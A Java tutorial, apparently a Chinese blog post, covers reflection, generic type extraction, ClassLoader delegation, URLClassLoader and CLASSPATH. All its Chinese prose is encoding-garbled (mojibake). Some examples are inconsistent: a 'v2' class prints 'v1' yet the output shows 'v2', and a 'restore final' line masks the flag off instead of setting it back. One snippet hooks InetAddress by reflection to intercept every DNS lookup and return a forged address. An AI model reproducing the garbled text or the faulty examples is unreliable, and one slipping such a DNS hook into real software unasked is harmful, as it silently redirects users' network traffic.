å®ä¾‹åŒ–ä¸€ä¸ªobjectï¼Œå‡è®¾æœ‰å¾ˆå¤šä¸ªæ„é€ å‡½æ•°çš„è¯ public void createViaReflection(){ String className = &quot;com.me.reflection._001_basic.MyObject&quot;; try { Class clazz = Class.forName(className); Constructor cons = clazz.getConstructor(String.class); //æˆ‘ä»¬å¸Œæœ›è¦è·å¾—ä¸€ä¸ªStringå‚æ•°çš„æ„é€ å‡½æ•° Object obj = cons.newInstance(&quot;passing value via constructor is ok -ish&quot;); System.out.println(obj); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } MyObject{name=â€™passing value via constructor is ok -ishâ€™, age=0} è·å–ä¸€ä¸ªclassä¸­æ‰€æœ‰çš„Filedsï¼ˆprivateçš„ä¹Ÿèƒ½æ‹¿åˆ°ï¼‰ public void getAllFields(){ try { String className = &quot;com.me.reflection._001_basic.MyObject&quot;; Class rClass = Class.forName(className); // Field: è·å–å±æ€§ï¼Œä¸‹é¢è¿˜ä¼šè®²åˆ°è·å–ç±»çš„æ–¹æ³•ï¼Œæ³¨æ„åŒºåˆ† Field field[] = rClass.getDeclaredFields(); for (int i = 0; i &lt; field.length; i++) { System.out.println(field[i].getName()); // è·å–ä¿®é¥°æƒé™ç¬¦ int mo = field[i].getModifiers(); System.out.println(&quot;mo: &quot;+mo); String priv = Modifier.toString(mo); // å±æ€§ç±»å‹ Class type = field[i].getType(); System.out.println(priv + &quot; &quot; + type.getName() + &quot; &quot; + field[i].getName()); } } catch (ClassNotFoundException e) { e.printStackTrace(); } } è¾“å‡ºï¼š namemo: 1public java.lang.String nameagemo: 2private int age è·å¾—ä¸€ä¸ªclassä¸­æ‰€æœ‰çš„æ–¹æ³•(æ‹¿ä¸åˆ°privateçš„å’Œæ„é€ å‡½æ•°ï¼Œçˆ¶ç±»çš„wait,notfyè¿™äº›åè€Œèƒ½å¤Ÿæ‹¿åˆ°),getMethodåªèƒ½æ‹¿åˆ°publicçš„æ–¹æ³•ï¼ŒgetDeclaredMethodåŸºæœ¬ä¸Šæ˜¯ä»€ä¹ˆç±»å‹çš„éƒ½èƒ½æ‹¿åˆ°(getDeclaredMethodsï¼Œæœ‰ä¸ªs) public void getAllMethods(){ try { String className = &quot;com.me.reflection._001_basic.MyObject&quot;; Class fClass = Class.forName(className); // Method[]: æ–¹æ³•æ•°ç»„ Method method[] = fClass.getMethods(); for (int i = 0; i &lt; method.length; i++) { // returnType :è¿”å›ç±»å‹ Class returnType = method[i].getReturnType(); System.out.println(&quot;ReturnType: &quot;+returnType); // è·å–å‚æ•°ç±»å‹ Class para[] = method[i].getParameterTypes(); int temp = method[i].getModifiers(); System.out.print(&quot;Modifier.toString: &quot;+Modifier.toString(temp) + &quot; &quot;); System.out.print(returnType.getName() + &quot; &quot;); System.out.print(method[i].getName() + &quot; &quot;); System.out.print(&quot;(&quot;); for (int j = 0; j &lt; para.length; ++j) { System.out.print(para[j].getName() + &quot; &quot; + &quot;arg&quot; + j); if (j &lt; para.length - 1) { System.out.print(&quot;,&quot;); } } // è·å–å¼‚å¸¸ç±»å‹ Class&lt;?&gt; exce[] = method[i].getExceptionTypes(); if (exce.length &gt; 0) { System.out.print(&quot;) throws &quot;); for (int k = 0; k &lt; exce.length; ++k) { System.out.print(exce[k].getName() + &quot; &quot;); if (k &lt; exce.length - 1) { System.out.print(&quot;,&quot;); } } } else { System.out.print(&quot;)&quot;); } System.out.println(); } } catch (ClassNotFoundException e) { e.printStackTrace(); } } æµ‹è¯•ä¸‹æ¥ï¼Œè¿™ä¸ªæ–¹æ³•èƒ½å¤Ÿæ‹¿åˆ°è‡ªå·±å†™çš„publicæ–¹æ³•ï¼Œprivateæ–¹æ³•ä¼¼ä¹æ‹¿ä¸åˆ°,è¿˜æœ‰ï¼Œè¿™é‡Œé¢ä¼¼ä¹æ‹¿ä¸åˆ°æ„é€ å‡½æ•° ReturnType: voidModifier.toString: public final void wait (long arg0,int arg1) throws java.lang.InterruptedExceptionReturnType: voidModifier.toString: public final native void wait (long arg0) throws java.lang.InterruptedExceptionReturnType: voidModifier.toString: public final void wait () throws java.lang.InterruptedExceptionReturnType: booleanModifier.toString: public boolean equals (java.lang.Object arg0)ReturnType: class java.lang.StringModifier.toString: public java.lang.String toString ()ReturnType: intModifier.toString: public native int hashCode ()ReturnType: class java.lang.ClassModifier.toString: public final native java.lang.Class getClass ()ReturnType: voidModifier.toString: public final native void notify ()ReturnType: voidModifier.toString: public final native void notifyAll () æ‹¿åˆ°æ–¹æ³•(Methodå¯¹è±¡ä¹‹åå°±è¦invokeäº†)ï¼Œä¸ç®¡æ˜¯privateè¿˜æ˜¯publicçš„ // å‡è®¾æˆ‘ä»¬çš„classæœ‰è¿™ä¹ˆä¸¤ä¸ªæ–¹æ³•,ä¹Ÿæ˜¯å¯ä»¥åŒºåˆ†å¼€æ¥çš„ public void echo(String name){ System.out.println(name); } public void echo(){ System.out.println(&quot;some kind of echo &quot;); } public void callMethodViaReflection(){ String className = &quot;com.me.reflection._001_basic.MyObject&quot;; try { Class&lt;?&gt; fClass = Class.forName(className); Method method = fClass.getDeclaredMethod(&quot;greet&quot;); method.setAccessible(true); //å¦‚æœè¿™æ˜¯ä¸€ä¸ªprivateçš„methodçš„è¯ï¼Œè¦setAccessible method.invoke(fClass.newInstance()); Method public_method_with_params = fClass.getMethod(&quot;echo&quot;,String.class); public_method_with_params.invoke(fClass.newInstance(),&quot;this is params from reflection&quot;); Method public_method_without_params = fClass.getMethod(&quot;echo&quot;); public_method_without_params.invoke(fClass.newInstance()); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } hello method without parametersthis is params from reflectionsome kind of echo ç”¨åå°„ç»™classçš„æŸä¸ªfieldèµ‹å€¼ public void setFiledWithReflection(){ String className = &quot;com.me.reflection._001_basic.MyObject&quot;; try { Class clss = Class.forName(className); Object obj = clss.newInstance(); Field field = clss.getDeclaredField(&quot;name&quot;); field.setAccessible(true); System.out.println(field.get(obj)); field.set(obj,&quot;this is some reflected filed&quot;); System.out.println(field.get(obj)); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (NoSuchFieldException e) { e.printStackTrace(); } } åå°„ç›¸å…³çš„ä¸œè¥¿åŸºæœ¬åˆ°æ­¤å®Œäº‹ï¼Œå®é™…ç”Ÿäº§ä¸­å½“ç„¶æ¨èä½¿ç”¨æˆç†Ÿçš„æ¡†æ¶ï¼Œæ¯”å¦‚Spring Frameworkçš„ReflectionUtils.å½“ç„¶æœ‰äº›ä¸œè¥¿æ˜¯æ²¡æ³•ç”¨åå°„å»ä¿®æ”¹çš„ï¼ˆç”¨InvocationHandleråªæ˜¯å¤¹å¸¦äº†ç§æ´»ï¼‰ï¼Œæ¯”å¦‚å‡½æ•°çš„å†…éƒ¨é€»è¾‘ï¼Œæ¯”å¦‚å¸¸é‡(å› ä¸ºç¼–è¯‘å™¨ç›´æ¥æŠŠå¸¸é‡æ¢æˆå¯¹åº”çš„å€¼äº†)ã€‚ æ¯”å¦‚ä»Tinkerçš„ä»£ç åº“é‡Œé¢æŠ„æ¥è¿™ä¹ˆä¸€æ®µï¼š /** * Locates a given field anywhere in the class inheritance hierarchy. * * @param instance an object to search the field into. * @param name field name * @return a field object * @throws NoSuchFieldException if the field cannot be located */ public static Field findField(Object instance, String name) throws NoSuchFieldException { for (Class&lt;?&gt; clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) { try { Field field = clazz.getDeclaredField(name); if (!field.isAccessible()) { field.setAccessible(true); } return field; } catch (NoSuchFieldException e) { // ignore and search next } } throw new NoSuchFieldException(&quot;Field &quot; + name + &quot; not found in &quot; + instance.getClass()); } public static Field findField(Class&lt;?&gt; originClazz, String name) throws NoSuchFieldException { for (Class&lt;?&gt; clazz = originClazz; clazz != null; clazz = clazz.getSuperclass()) { try { Field field = clazz.getDeclaredField(name); if (!field.isAccessible()) { field.setAccessible(true); } return field; } catch (NoSuchFieldException e) { // ignore and search next } } throw new NoSuchFieldException(&quot;Field &quot; + name + &quot; not found in &quot; + originClazz); } /** * Locates a given method anywhere in the class inheritance hierarchy. * * @param instance an object to search the method into. * @param name method name * @param parameterTypes method parameter types * @return a method object * @throws NoSuchMethodException if the method cannot be located */ public static Method findMethod(Object instance, String name, Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException { for (Class&lt;?&gt; clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) { try { Method method = clazz.getDeclaredMethod(name, parameterTypes); if (!method.isAccessible()) { method.setAccessible(true); } return method; } catch (NoSuchMethodException e) { // ignore and search next } } throw new NoSuchMethodException(&quot;Method &quot; + name + &quot; with parameters &quot; + Arrays.asList(parameterTypes) + &quot; not found in &quot; + instance.getClass()); } /** * Locates a given method anywhere in the class inheritance hierarchy. * * @param clazz a class to search the method into. * @param name method name * @param parameterTypes method parameter types * @return a method object * @throws NoSuchMethodException if the method cannot be located */ public static Method findMethod(Class&lt;?&gt; clazz, String name, Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException { for (; clazz != null; clazz = clazz.getSuperclass()) { try { Method method = clazz.getDeclaredMethod(name, parameterTypes); if (!method.isAccessible()) { method.setAccessible(true); } return method; } catch (NoSuchMethodException e) { // ignore and search next } } throw new NoSuchMethodException(&quot;Method &quot; + name + &quot; with parameters &quot; + Arrays.asList(parameterTypes) + &quot; not found in &quot; + clazz); } /** * Locates a given constructor anywhere in the class inheritance hierarchy. * * @param instance an object to search the constructor into. * @param parameterTypes constructor parameter types * @return a constructor object * @throws NoSuchMethodException if the constructor cannot be located */ public static Constructor&lt;?&gt; findConstructor(Object instance, Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException { for (Class&lt;?&gt; clazz = instance.getClass(); clazz != null; clazz = clazz.getSuperclass()) { try { Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(parameterTypes); if (!ctor.isAccessible()) { ctor.setAccessible(true); } return ctor; } catch (NoSuchMethodException e) { // ignore and search next } } throw new NoSuchMethodException(&quot;Constructor&quot; + &quot; with parameters &quot; + Arrays.asList(parameterTypes) + &quot; not found in &quot; + instance.getClass()); } å’Œåå°„ç›¸å…³çš„ç±»åº”è¯¥è¿˜æœ‰Typeï¼Œå…³äºTypeï¼Œæœ€æœ‰åçš„å°±æ˜¯ä»ä¸€ä¸ªæ³›å‹ç±»ä¸­è·å–æ³›å‹é‡Œé¢Tçš„classå¯¹è±¡ã€‚ä½†è¿™æ˜¯æœ‰æ¡ä»¶çš„ã€‚éœ€è¦æ³›å‹å®šä¹‰åœ¨ä¸€ä¸ªçˆ¶ç±»ä¸Šï¼Œå­ç±»å¯¹è±¡åœ¨åˆå§‹åŒ–çš„æ—¶å€™ç¡®å®šä¸€ä¸ªT,åé¢å°±å¯ä»¥é€šè¿‡è¿™ä¸ªå­ç±»å¯¹è±¡çš„å®ä¾‹æ¥è·å¾—åˆšæ‰è¿™ä¸ªTçš„class. Class&lt;?&gt; classType = Integer.TYPE; //è¿™å…¶å®æ˜¯ä¸€ä¸ªclass // ä»æ³›å‹classä¸­è·å–Tçš„ç±»å‹ public void someMethod(){ HashMap&lt;String,Integer&gt; map = new HashMap&lt;String, Integer&gt;(){}; Type mySuperclass = map.getClass().getGenericSuperclass(); Type type = ((ParameterizedType)mySuperclass).getActualTypeArguments()[0]; Type type2 = ((ParameterizedType)mySuperclass).getActualTypeArguments()[1]; System.out.println(mySuperclass);// java.util.HashMap&lt;java.lang.String, java.lang.Integer&gt; System.out.println(type+&quot; &quot;+type2); //class java.lang.String class java.lang.Integer } public void someMethod2(){ HashMap&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); // ç±»å‹æ“¦é™¤ Type mySuperclass = map.getClass().getGenericSuperclass(); Type type = ((ParameterizedType)mySuperclass).getActualTypeArguments()[0]; Type type2 = ((ParameterizedType)mySuperclass).getActualTypeArguments()[1]; System.out.println(mySuperclass); // java.util.AbstractMap&lt;K, V&gt; System.out.println(type+&quot; &quot;+type2); //K V } // æˆ–è€… public static abstract class Foo&lt;T&gt; { //content } public static class FooChild extends Foo&lt;String&gt; { //content } public static Type[] getParameterizedTypes(Object object) { Type superclassType = object.getClass().getGenericSuperclass(); if (!ParameterizedType.class.isAssignableFrom(superclassType.getClass())) { return null; } return ((ParameterizedType)superclassType).getActualTypeArguments(); } public static void main(String[] args) { Foo foo = new FooChild(); Type[] types= getParameterizedTypes(foo); System.out.println(types[0] == String.class); // true ,Typeæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ç°ç±»åªæœ‰Class } çœ‹ä¸‹æ¥éƒ½æ˜¯éœ€è¦ä¸€ä¸ªæ”¯æŒæ³›å‹çš„çˆ¶ç±»ï¼Œç„¶åå­ç±»ç»§æ‰¿è¿™ä¸ªçˆ¶ç±»å¹¶æŒ‡å®šæ³›å‹ä¸­çš„Tæ˜¯å“ªä¸ªclassï¼Œå¤–éƒ¨å°±å¯ä»¥æ‹¿ç€è¿™ä¸ªçˆ¶ç±»çš„æŒ‡é’ˆ(æŒ‡å‘å¡«å……äº†Tç±»å‹çš„å­ç±»çš„Object)è°ƒç”¨getGenericSuperclassæ–¹æ³•å†è½¬æˆParameterizedTypeå»è°ƒç”¨getActualTypeArgumentsæ–¹æ³•äº†ã€‚ è¿™é‡Œé¢æ¶‰åŠåˆ°çš„ç±»å’Œæ¥å£åŒ…æ‹¬:ParameterizedType,TypeVariable,GenericArrayType,WildcardTypeï¼ˆè¿™å››ä¸ªå…¨éƒ¨æ˜¯æ¥å£ï¼‰ç­‰Typeè¯¦è§£ç”±äºç±»å‹æ“¦é™¤ï¼Œclasså¯¹è±¡ä¸­å¹¶ä¸èƒ½ä¿æœ‰ç¼–è¯‘å‰çš„ç±»çš„ä¿¡æ¯ï¼Œå¼•å…¥Typeä¼¼ä¹æ˜¯ä¸ºäº†è¿åˆåå°„çš„éœ€è¦ã€‚ ClassLoaderçš„ä½¿ç”¨å¥—è·¯classloaderå’Œclassçš„ç”Ÿå‘½å‘¨æœŸ,çŸ¥ä¹ä¸“æ  JVM ä¸­å†…ç½®äº†ä¸‰ä¸ªé‡è¦çš„ ClassLoaderï¼Œåˆ†åˆ«æ˜¯ BootstrapClassLoaderã€ExtensionClassLoader å’Œ AppClassLoaderã€‚ BootstrapClassLoader è´Ÿè´£åŠ è½½ JVM è¿è¡Œæ—¶æ ¸å¿ƒç±»ï¼Œè¿™äº›ç±»ä½äº JAVA_HOME/lib/rt.jar æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨å†…ç½®åº“ java.xxx.* éƒ½åœ¨é‡Œé¢ï¼Œæ¯”å¦‚ java.util.*ã€java.io.*ã€java.nio.*ã€java.lang.* ç­‰ç­‰ã€‚è¿™ä¸ª ClassLoader æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ˜¯ç”± C ä»£ç å®ç°çš„ï¼Œæˆ‘ä»¬å°†å®ƒç§°ä¹‹ä¸ºã€Œæ ¹åŠ è½½å™¨ã€ã€‚ ExtensionClassLoader è´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ¯”å¦‚ swing ç³»åˆ—ã€å†…ç½®çš„ js å¼•æ“ã€xml è§£æå™¨ ç­‰ç­‰ï¼Œè¿™äº›åº“åé€šå¸¸ä»¥ javax å¼€å¤´ï¼Œå®ƒä»¬çš„ jar åŒ…ä½äº JAVA_HOME/lib/ext/*.jar ä¸­ï¼Œæœ‰å¾ˆå¤š jar åŒ…ã€‚ AppClassLoader æ‰æ˜¯ç›´æ¥é¢å‘æˆ‘ä»¬ç”¨æˆ·çš„åŠ è½½å™¨ï¼Œå®ƒä¼šåŠ è½½ Classpath ç¯å¢ƒå˜é‡é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„ jar åŒ…å’Œç›®å½•ã€‚æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ä»£ç ä»¥åŠä½¿ç”¨çš„ç¬¬ä¸‰æ–¹ jar åŒ…é€šå¸¸éƒ½æ˜¯ç”±å®ƒæ¥åŠ è½½çš„ã€‚ é‚£äº›ä½äºç½‘ç»œä¸Šé™æ€æ–‡ä»¶æœåŠ¡å™¨æä¾›çš„ jar åŒ…å’Œ classæ–‡ä»¶ï¼Œjdk å†…ç½®äº†ä¸€ä¸ª URLClassLoaderï¼Œç”¨æˆ·åªéœ€è¦ä¼ é€’è§„èŒƒçš„ç½‘ç»œè·¯å¾„ç»™æ„é€ å™¨ï¼Œå°±å¯ä»¥ä½¿ç”¨ URLClassLoader æ¥åŠ è½½è¿œç¨‹ç±»åº“äº†ã€‚ ExtensionClassLoader å’Œ AppClassLoader éƒ½æ˜¯ URLClassLoader çš„å­ç±»ï¼Œå®ƒä»¬éƒ½æ˜¯ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿé‡ŒåŠ è½½ç±»åº“ã€‚ åŒäº²å§”æ´¾ AppClassLoader åœ¨åŠ è½½ä¸€ä¸ªæœªçŸ¥çš„ç±»åæ—¶ï¼Œå®ƒå¹¶ä¸æ˜¯ç«‹å³å»æœå¯» Classpathï¼Œå®ƒä¼šé¦–å…ˆå°†è¿™ä¸ªç±»åç§°äº¤ç»™ ExtensionClassLoader æ¥åŠ è½½ï¼Œå¦‚æœ ExtensionClassLoader å¯ä»¥åŠ è½½ï¼Œé‚£ä¹ˆ AppClassLoader å°±ä¸ç”¨éº»çƒ¦äº†ã€‚å¦åˆ™å®ƒå°±ä¼šæœç´¢ Classpath ã€‚ è€Œ ExtensionClassLoader åœ¨åŠ è½½ä¸€ä¸ªæœªçŸ¥çš„ç±»åæ—¶ï¼Œå®ƒä¹Ÿå¹¶ä¸æ˜¯ç«‹å³æœå¯» ext è·¯å¾„ï¼Œå®ƒä¼šé¦–å…ˆå°†ç±»åç§°äº¤ç»™ BootstrapClassLoader æ¥åŠ è½½ï¼Œå¦‚æœ BootstrapClassLoader å¯ä»¥åŠ è½½ï¼Œé‚£ä¹ˆ ExtensionClassLoader ä¹Ÿå°±ä¸ç”¨éº»çƒ¦äº†ã€‚å¦åˆ™å®ƒå°±ä¼šæœç´¢ ext è·¯å¾„ä¸‹çš„ jar åŒ…ã€‚ è¿™ä¸‰ä¸ª ClassLoader ä¹‹é—´å½¢æˆäº†çº§è”çš„çˆ¶å­å…³ç³»ï¼Œæ¯ä¸ª ClassLoader éƒ½å¾ˆæ‡’ï¼Œå°½é‡æŠŠå·¥ä½œäº¤ç»™çˆ¶äº²åšï¼Œçˆ¶äº²å¹²ä¸äº†äº†è‡ªå·±æ‰ä¼šå¹²ã€‚æ¯ä¸ª ClassLoader å¯¹è±¡å†…éƒ¨éƒ½ä¼šæœ‰ä¸€ä¸ª parent å±æ€§æŒ‡å‘å®ƒçš„çˆ¶åŠ è½½å™¨ã€‚ $ cat ~/source/jcl/v1/Dep.java public class Dep { public void print() { System.out.println(&quot;v1&quot;); } } $ cat ~/source/jcl/v2/Dep.java public class Dep { public void print() { System.out.println(&quot;v1&quot;); } } $ cat ~/source/jcl/Test.java public class Test { public static void main(String[] args) throws Exception { String v1dir = &quot;file:///Users/qianwp/source/jcl/v1/&quot;; String v2dir = &quot;file:///Users/qianwp/source/jcl/v2/&quot;; URLClassLoader v1 = new URLClassLoader(new URL[]{new URL(v1dir)}); URLClassLoader v2 = new URLClassLoader(new URL[]{new URL(v2dir)}); Class&lt;?&gt; depv1Class = v1.loadClass(&quot;Dep&quot;); Object depv1 = depv1Class.getConstructor().newInstance(); depv1Class.getMethod(&quot;print&quot;).invoke(depv1); Class&lt;?&gt; depv2Class = v2.loadClass(&quot;Dep&quot;); Object depv2 = depv2Class.getConstructor().newInstance(); depv2Class.getMethod(&quot;print&quot;).invoke(depv2); System.out.println(depv1Class.equals(depv2Class)); } } ä¸Šé¢çš„ä»£ç çš„è¿è¡Œç»“æœæ˜¯è¿™æ ·çš„ $ cd ~/source/jcl/v1 $ javac Dep.java $ cd ~/source/jcl/v2 $ javac Dep.java $ cd ~/source/jcl $ javac Test.java $ java Test v1 v2 false spiæ‰“ç ´äº†åŒäº²å§”æ´¾æœºåˆ¶ï¼ˆå¦‚ä½•åœ¨çˆ¶åŠ è½½å™¨åŠ è½½çš„ç±»ä¸­ï¼Œå»è°ƒç”¨å­åŠ è½½å™¨å»åŠ è½½ç±»ï¼Ÿï¼‰ ä½¿ç”¨Thread.currentThread().getContextClassLoader()å°±å¯ä»¥å®ç°åœ¨æ ¸å¿ƒåŒ…é‡Œçš„åŸºç¡€ç±»è°ƒç”¨ç”¨æˆ·ä»£ç  åå°„æ›¿æ¢finalæˆå‘˜å˜é‡çš„æ—¶å€™è¦å°å¿ƒä¸€ç§å…¨å±€æ‹¦æˆªå¹¶ç›‘æ§ DNS çš„æ–¹å¼ æ–‡ä¸­æåˆ°,è¦æ”¹ä¸€ä¸‹Modifierçš„flag try { //è·å–InetAddressä¸­çš„impl Field impl = InetAddress.class.getDeclaredField(&quot;impl&quot;); impl.setAccessible(true); //è·å–accessFlags Field modifiersField = Field.class.getDeclaredField(&quot;accessFlags&quot;); modifiersField.setAccessible(true); //å»final modifiersField.setInt(impl, impl.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL); //è·å–åŸå§‹InetAddressImplå¯¹è±¡ final Object originalImpl = impl.get(null); //æ„å»ºåŠ¨æ€ä»£ç†InetAddressImplå¯¹è±¡ Object dynamicImpl = Proxy.newProxyInstance(originalImpl.getClass().getClassLoader(), originalImpl.getClass().getInterfaces(), new InvocationHandler() { final Object lock = new Object(); Constructor&lt;Inet4Address&gt; constructor = null; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //å¦‚æœå‡½æ•°åä¸ºlookupAllHostAddrï¼Œå¹¶ä¸”å‚æ•°é•¿åº¦ä¸º2ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯hostï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯netId if (method.getName().equals(&quot;lookupAllHostAddr&quot;) &amp;&amp; args != null &amp;&amp; args.length == 2) { Log.e(&quot;TAG&quot;, &quot;lookupAllHostAddrï¼š&quot; + Arrays.asList(args)); //è·å–Inet4Addressçš„æ„é€ å‡½æ•°ï¼Œå¯èƒ½è¿˜éœ€è¦Inet6Addressçš„æ„é€ å‡½æ•°ï¼Œä¸ºäº†æ¼”ç¤ºï¼Œç®€å•å¤„ç† if (constructor == null) { synchronized (lock) { if (constructor == null) { try { constructor = Inet4Address.class.getDeclaredConstructor(String.class, byte[].class); constructor.setAccessible(true); } catch (Exception e) { e.printStackTrace(); } } } } if (constructor != null) { //è¿™é‡Œå®ç°è‡ªå·±çš„é€»è¾‘ //æ„é€ ä¸€ä¸ªmockçš„dnsè§£æå¹¶è¿”å› if (args[0] != null &amp;&amp; &quot;www.baidu.com&quot;.equalsIgnoreCase(args[0].toString())) { try { Inet4Address inetAddress = constructor.newInstance(null, new byte[]{(byte) 61, (byte) 135, (byte) 169, (byte) 121}); return new InetAddress[]{inetAddress}; } catch (Exception e) { e.printStackTrace(); } } } } return method.invoke(originalImpl, args); } }); //æ›¿æ¢implä¸ºåŠ¨æ€ä»£ç†å¯¹è±¡ impl.set(null, dynamicImpl); //è¿˜åŸfinal modifiersField.setInt(impl, impl.getModifiers() &amp; java.lang.reflect.Modifier.FINAL); } catch (Exception e) { e.printStackTrace(); } classLoaderåœ¨loadClassï¼ˆæ— è®ºæ˜¯éšå¼çš„new XXXè¿˜æ˜¯æ˜¾å¼çš„classLoader.loadClass..ï¼‰éƒ½ä¼šèµ°ç¼“å­˜ç¼“å­˜æœºåˆ¶ä¼šå°†å·²ç»åŠ è½½çš„classç¼“å­˜èµ·æ¥ï¼Œå½“ç¨‹åºä¸­éœ€è¦ä½¿ç”¨æŸä¸ªClassæ—¶ï¼Œç±»åŠ è½½å™¨å…ˆä»ç¼“å­˜åŒºä¸­æœå¯»è¯¥Classï¼Œåªæœ‰å½“ç¼“å­˜ä¸­ä¸å­˜åœ¨è¯¥Classæ—¶ï¼Œç³»ç»Ÿæ‰ä¼šè¯»å–è¯¥ç±»çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºClasså¯¹è±¡ï¼Œå­˜å…¥ç¼“å­˜ä¸­ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ›´æ”¹äº†classåï¼Œéœ€è¦é‡å¯JVMæ‰ç”Ÿæ•ˆçš„åŸå› ã€‚ èƒ½ä¸èƒ½è‡ªå·±å†™ä¸ªç±»å«java.lang.Systemï¼Ÿ çœ‹äº†å¾ˆå¤šåšå®¢çš„æ‘˜æŠ„ï¼Œæ„æ€æ˜¯ä¸å¯èƒ½ã€‚è¿›ä¸€æ­¥è¯´,java.lang.xxxï¼Œç”šè‡³æ˜¯java.xxx.xxxéƒ½ä¸å¯èƒ½ã€‚åŸå› åœ¨java.lang.ClassLoaderè¿™ä¸ªæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªpreDefineClassæ–¹æ³•ï¼Œ // Note: Checking logic in java.lang.invoke.MemberName.checkForTypeAlias // relies on the fact that spoofing is impossible if a class has a name // of the form &quot;java.*&quot; if ((name != null) &amp;&amp; name.startsWith(&quot;java.&quot;)) { throw new SecurityException (&quot;Prohibited package name: &quot; + name.substring(0, name.lastIndexOf(&#39;.&#39;))); } è¿™ä¸ªæ–¹æ³•åœ¨defineClasså‰è°ƒç”¨ã€‚å®é™…ä¸Šæ ¹æ®byte[]ç”Ÿæˆclasså¯¹è±¡çš„æ–¹æ³•å«åšdefineClass0ï¼ŒdefineClass1ï¼ŒdefineClass2ã€‚BootStrapClassLoader(C++å†™çš„)è´Ÿè´£åŠ è½½rt.jarä¸­çš„æ‰€æœ‰class(java.xxx.xxx,sun.xxx.xxxâ€¦.ç­‰ç­‰éƒ½æ˜¯ï¼ŒåŒ…æ‹¬sun.misc.Unsafeä»¥åŠsun.nio.ch.DirectBufferç­‰ç­‰ã€‚ã€‚)ï¼Œæ‰€ä»¥è¿™äº›ç”±BootStrapClassLoaderåŠ è½½çš„classçš„getClassLoaderæ–¹æ³•è¿”å›çš„éƒ½æ˜¯null.BootStrapClassLoader(C++å†™çš„ï¼Œè´Ÿè´£åŠ è½½rt.jarä¸‹é¢çš„æ‰€æœ‰class,å°±æ˜¯åŒ…åä»¥java.å¼€å¤´çš„ä»¥åŠsun.xxxå¼€å¤´çš„)sun.misc.ExtClassLoader(è´Ÿè´£java.ext.dirsè¿™ä¸ªä½ç½®ï¼Œä¹Ÿå°±æ˜¯jre/lib/extæ–‡ä»¶å¤¹ä¸‹é¢çš„ä¸œè¥¿) /c/Program Files/Java/jre1.8.0_201/lib/ext Î» ls access-bridge-64.jar dnsns.jar jfxrt.jar meta-index sunec.jar sunmscapi.jar zipfs.jar cldrdata.jar jaccess.jar localedata.jar nashorn.jar sunjce_provider.jar sunpkcs11.jar sun.misc.AppClassLoader(è´Ÿè´£java.class.pathè¿™ä¸ªä½ç½®ï¼Œå°±æ˜¯/c/Program Files/Java/jre1.8.0_201/lib/æ–‡ä»¶å¤¹ä¸‹é¢çš„æ‰€æœ‰jaråŒ…,ä»¥åŠ/c/Program Files/Java/jre1.8.0_201/lib/extä¸­çš„æ‰€æœ‰jaråŒ…ï¼Œè¿™ä¸ªå…¶å®æ˜¯å§”æ‰˜ä¸Šå»äº†)ã€‚ java çš„CLASSPATHé¦–å…ˆæ¥çœ‹ä¸€ä¸‹ä¸€å°windowsä¸Šçš„classPathé•¿ä»€ä¹ˆæ · echo &quot;${CLASSPATH}&quot; .;C:\\Program Files\\Java\\jdk1.8.0_201\\bin;C:\\Program Files\\Java\\jdk1.8.0_201\\lib\\dt.jar;C:\\Program Files\\Java\\jdk1.8.0_201\\lib\\tools.jar åˆ†åˆ«æ˜¯â€.â€å½“å‰æ–‡ä»¶å¤¹ï¼Œbinæ–‡ä»¶å¤¹ï¼Œlibæ–‡ä»¶å¤¹ä¸‹é¢çš„dt.jarï¼Œä»¥åŠlibä¸‹é¢çš„tools.jarbinæ–‡ä»¶å¤¹é‡Œæ”¾çš„éƒ½æ˜¯äº›å¯æ‰§è¡Œæ–‡ä»¶(windowsä¸Šæ˜¯.exeæ–‡ä»¶),å®ƒä»¬å®é™…ä¸Šä»…ä»…ç›¸å½“äºæ˜¯ä¸€å±‚ä»£ç çš„åŒ…è£…ï¼Œè¿™äº›å·¥å…·çš„å®ç°æ‰€è¦ç”¨åˆ°çš„ç±»åº“éƒ½åœ¨tools.jarä¸­(è¿™äº›è·Ÿè¿è¡ŒæœŸæ²¡ä»€ä¹ˆå…³ç³»)dt.jar ä¸»è¦æ˜¯SwingåŒ…,ç”¨è§£å‹ç¼©è½¯ä»¶çœ‹ä¸‹å°±çŸ¥é“äº† ä¸Šè¿°è¿™äº›ä½ç½®(â€œ.â€, â€œbin/â€œ.â€lib/dt.jarâ€, â€œlib/tools.jarâ€)éƒ½æ˜¯ç”±Application ClassLoaderåŠ è½½çš„ 